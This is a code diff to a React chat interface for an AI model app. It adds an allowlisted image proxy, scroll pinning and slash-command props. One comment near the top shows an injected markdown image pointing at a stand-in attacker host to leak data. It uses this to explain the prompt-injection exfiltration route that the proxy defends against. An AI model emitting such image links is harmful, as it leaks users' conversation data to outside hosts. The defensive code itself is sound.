@@ -26,6 +26,88 @@ type SuggestionItem =
   | { kind: "command"; cmd: ChatCommand }
   | { kind: "skill"; slug: string; name: string; description?: string; built_in?: boolean };
 
+// Renders a markdown image. Remote http(s) sources are routed through the
+// `fetch_proxied_image` backend command, which only fetches hosts on the user's
+// allowlist and returns a base64 `data:` URI. This keeps the CSP locked to
+// `img-src 'self' data:` (no remote image origins), so an injected
+// `![](https://attacker/?leak=...)` cannot fire a request or leak data.
+// `data:` and relative/self sources render directly.
+function ProxiedImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
+    const [resolved, setResolved] = useState<string | null>(null);
+    const [error, setError] = useState<string | null>(null);
+    const [attempt, setAttempt] = useState(0);
+
+    const isRemote = !!src && /^https?:\/\//i.test(src);
+
+    useEffect(() => {
+        let cancelled = false;
+        setError(null);
+        if (!src) {
+            setResolved(null);
+            return;
+        }
+        if (!isRemote) {
+            // data:, blob:, or app-relative — safe to render directly.
+            setResolved(src);
+            return;
+        }
+        setResolved(null);
+        invoke<string>("fetch_proxied_image", { url: src })
+            .then((dataUri) => {
+                if (!cancelled) setResolved(dataUri);
+            })
+            .catch((e) => {
+                // Surface the real backend reason (allowlist rejection, HTTP
+                // status, content-type, size cap, …) instead of guessing.
+                if (!cancelled) setError(typeof e === "string" ? e : (e?.message ?? String(e)));
+            });
+        return () => {
+            cancelled = true;
+        };
+    }, [src, isRemote, attempt]);
+
+    if (error) {
+        const isAllowlist = /allowlist/i.test(error);
+        return (
+            <span className="inline-flex flex-col gap-1 my-2 px-3 py-2 rounded-lg border border-[var(--color-border-secondary)] bg-[var(--color-bg-tertiary)]/40 text-xs text-[var(--color-text-secondary)]">
+                <span className="font-medium">Image not shown</span>
+                <span className="opacity-80 break-all">{error}</span>
+                {isAllowlist && (
+                    <span className="opacity-60">
+                        Add this host (and bucket path, if any) in Settings → Appearance → Image Display Allowlist, then click Save Configuration.
+                    </span>
+                )}
+                <button
+                    onClick={() => setAttempt((n) => n + 1)}
+                    className="self-start inline-flex items-center gap-1.5 mt-1 text-[var(--color-text-secondary)] hover:text-[var(--color-text-primary)] transition-colors"
+                >
+                    <RefreshCw size={11} /> Retry
+                </button>
+            </span>
+        );
+    }
+
+    if (isRemote && !resolved) {
+        return (
+            <span className="inline-flex items-center gap-2 my-2 px-3 py-2 rounded-lg border border-[var(--color-border-secondary)] bg-[var(--color-bg-tertiary)]/40 text-xs text-[var(--color-text-secondary)]">
+                <RefreshCw size={12} className="animate-spin" />
+                Loading image…
+            </span>
+        );
+    }
+
+    if (!resolved) return null;
+
+    return (
+        <img
+            src={resolved}
+            alt={alt || ""}
+            title={title}
+            className="max-w-full h-auto my-2 rounded-lg border border-[var(--color-border-secondary)]"
+        />
+    );
+}
+
 // Built-in, in-process tool names. Auto-approved by default since they only
 // touch local audit-visible content the user can inspect on disk. Kept in
 // sync with the matching Rust constants:
@@ -86,6 +168,7 @@ interface StreamStatsEvent {
 
 interface ChatInterfaceProps {
     conversationId: string | null;
+    onCreateConversation?: (title: string) => Promise<string | null>;
 }
 
 interface ModelOption {
@@ -116,7 +199,7 @@ interface GenerationSettings {
     reasoning_effort?: string; // "low", "medium", "high"
 }
 
-export default function ChatInterface({ conversationId }: ChatInterfaceProps) {
+export default function ChatInterface({ conversationId, onCreateConversation }: ChatInterfaceProps) {
     const [messages, setMessages] = useState<Message[]>([]);
     const [input, setInput] = useState("");
     const [loading, setLoading] = useState(false);
@@ -205,6 +288,7 @@ export default function ChatInterface({ conversationId }: ChatInterfaceProps) {
     const pendingStatsRef = useRef<StreamStatsEvent | null>(null);
 
     const scrollRef = useRef<HTMLDivElement>(null);
+    const contentRef = useRef<HTMLDivElement>(null);
 
     const activeStreamRef = useRef<{
         requestId: string;
@@ -378,6 +462,25 @@ export default function ChatInterface({ conversationId }: ChatInterfaceProps) {
 
         return () => clearTimeout(timer);
     }, [messages]);
+
+    // Images (and other async content) finish loading after the message is
+    // rendered, changing the scroll height long after `messages` last changed.
+    // Without this, a late layout shift breaks the browser's scroll anchoring
+    // and can jump the view up to the first image. Re-pin to the bottom on any
+    // content-height change, but only when the user is already at the bottom —
+    // never yank someone who has scrolled up to read.
+    useEffect(() => {
+        const el = scrollRef.current;
+        const content = contentRef.current;
+        if (!el || !content) return;
+        const ro = new ResizeObserver(() => {
+            if (autoScrollRef.current) {
+                el.scrollTop = el.scrollHeight;
+            }
+        });
+        ro.observe(content);
+        return () => ro.disconnect();
+    }, []);
 
     // Token Counting
     const [tokenCount, setTokenCount] = useState<number>(0);
@@ -850,9 +953,13 @@ export default function ChatInterface({ conversationId }: ChatInterfaceProps) {
             addSystemNote: (content: string) => {
                 addSystemNoteToMessages(setMessages, content);
             },
+            onCreateConversation,
+            availableModels,
+            selectedModel,
+            setSelectedModel,
         };
         await executeSlashCommand(commandString, ctx);
-    }, [conversationId, setInput, setMessages]);
+    }, [conversationId, setInput, setMessages, onCreateConversation, availableModels, selectedModel]);
 
     const runTools = async (tools: { name: string, args: any, callId: string }[], baseHistory: Message[]) => {
         setLoading(true);
@@ -1239,6 +1346,10 @@ export default function ChatInterface({ conversationId }: ChatInterfaceProps) {
                 addSystemNote: (content: string) => {
                     addSystemNoteToMessages(setMessages, content);
                 },
+                onCreateConversation,
+                availableModels,
+                selectedModel,
+                setSelectedModel,
             };
 
             const handled = await executeSlashCommand(input, ctx);
@@ -1667,7 +1778,7 @@ export default function ChatInterface({ conversationId }: ChatInterfaceProps) {
             {/* Chat area + side panels share horizontal space — panels shrink the chat */}
             <div className="flex-1 flex flex-row min-h-0">
             <div
-                className="flex-1 overflow-y-auto p-4 space-y-6 min-h-0 min-w-0 font-chat"
+                className="flex-1 overflow-y-auto p-4 min-h-0 min-w-0 font-chat"
                 ref={scrollRef}
                 onScroll={handleScroll}
             >
@@ -1677,20 +1788,22 @@ export default function ChatInterface({ conversationId }: ChatInterfaceProps) {
                         Re-embedding memory documents: {reembedProgress.current} / {reembedProgress.total}
                     </div>
                 )}
-                {messages.map((m, i) => (
-                    <ChatMessage
-                        key={m.id || `${m.role}-${m.created_at ?? "?"}-${i}`}
-                        message={m}
-                        index={i}
-                        onCopy={handleCopy}
-                        onEdit={handleEdit}
-                        onDelete={handleDelete}
-                        onRegenerate={handleRegenerate}
-                        onSaveAsFact={handleSaveAsFact}
-                        showTimestamp={showMessageTimestamps}
-                        genStats={m.id ? messageStats[m.id] : undefined}
-                    />
-                ))}
+                <div ref={contentRef} className="space-y-6">
+                    {messages.map((m, i) => (
+                        <ChatMessage
+                            key={m.id || `${m.role}-${m.created_at ?? "?"}-${i}`}
+                            message={m}
+                            index={i}
+                            onCopy={handleCopy}
+                            onEdit={handleEdit}
+                            onDelete={handleDelete}
+                            onRegenerate={handleRegenerate}
+                            onSaveAsFact={handleSaveAsFact}
+                            showTimestamp={showMessageTimestamps}
+                            genStats={m.id ? messageStats[m.id] : undefined}
+                        />
+                    ))}
+                </div>
             </div>
             </div>
 
@@ -2204,6 +2317,7 @@ const ChatMessage = memo(({ message: m, index: i, onCopy, onEdit, onDelete, onRe
                                                     h3: ({ node, ...props }) => <h3 className="text-lg font-semibold mb-2 mt-3" {...props} />,
                                                     p: ({ node, ...props }) => <p className="mb-3 last:mb-0" {...props} />,
                                                     a: ({ node, ...props }) => <a className="text-blue-400 hover:underline" target="_blank" rel="noopener noreferrer" {...props} />,
+                                                    img: ({ src, alt, title }: any) => <ProxiedImage src={typeof src === "string" ? src : undefined} alt={alt} title={title} />,
                                                     code({ node, inline, className, children, ...props }: any) {
                                                         const match = /language-(\w+)/.exec(className || '')
                                                         const codeText = String(children).replace(/\n$/, '')
